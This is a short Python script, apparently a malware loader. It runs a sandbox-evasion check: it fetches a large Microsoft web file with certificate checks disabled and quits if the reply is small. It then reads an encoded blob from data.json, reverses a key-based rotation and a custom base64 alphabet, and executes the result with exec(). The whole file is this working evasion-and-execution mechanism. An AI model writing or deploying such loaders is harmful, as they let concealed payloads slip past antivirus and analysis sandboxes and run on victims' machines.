# coding:utf-8
import ctypes.wintypes
import base64
import json
import random
import base64
import urllib.request
import urllib.error
import ssl
import time
import sys


def loadjson(file='data.json'):
    # 从JSON 文件中读取数据
    with open(file, 'r', encoding='utf-8') as json_file:
        data_from_file = json.load(json_file)

    # 解析 JSON 数据
    key = data_from_file['key']
    custom_alphabet = data_from_file['custom_alphabet'].encode('utf-8')
    encoded_data = data_from_file['encoded_data']
    runcode = data_from_file['run']
    return key,custom_alphabet,encoded_data,runcode

#沙箱测试
class test_network():
    MAX_RETRIES = 3
    RETRY_DELAY = 300

    def __init__(self):
        self.custom_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Pragma': 'no-cache',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
        }

    def read_with_retry(self, url, skip_verification=False):
        for attempt in range(self.MAX_RETRIES + 1):
            try:
                request = urllib.request.Request(url, headers=self.custom_headers)
                if skip_verification:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(request, context=context) as response:
                        data = response.read()
                else:
                    with urllib.request.urlopen(request) as response:
                        data = response.read()
                return data
            except urllib.error.URLError as e:
                if attempt < self.MAX_RETRIES:
                    time.sleep(self.RETRY_DELAY)
                else:
                    return None

class Base64Decoder:
    def __init__(self, data, key):
        self.data = data
        self.CUSTOM_ALPHABET = custom_alphabet
        self.DECODE_TRANS = bytes.maketrans(self.CUSTOM_ALPHABET, b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/')
        self.key = key

    def decode(self):
        data = self.data[len(self.data) - self.key:] + self.data[:len(self.data) - self.key]
        return base64.b64decode(data.translate(self.DECODE_TRANS))


if __name__ == '__main__':
    # 网络测试
    web_reader = test_network()
    url = "https://www.microsoft.com/etc.clientlibs/cascade.component.authoring/clientlibs/clientlib-polyfills.min.ACSHASHf381d5147c85ee687ea8fbef32c83d37.js"
    skip_verification = True  # 是否跳过证书验证的开关，True代表跳过
    response_data = web_reader.read_with_retry(url, skip_verification)

    if response_data is None:
        sys.exit()

    response_length = len(response_data)
    if response_length < 60000:
        sys.exit()

    # print(f"响应数据的字节数：{response_length}")
    key, custom_alphabet, encoded_data, run= loadjson()

    # 解码
    decoder = Base64Decoder(encoded_data, key)
    decoded_data = decoder.decode()

    codedata = Base64Decoder(run, key).decode()
    # print(codedata)

    exec(decoded_data)





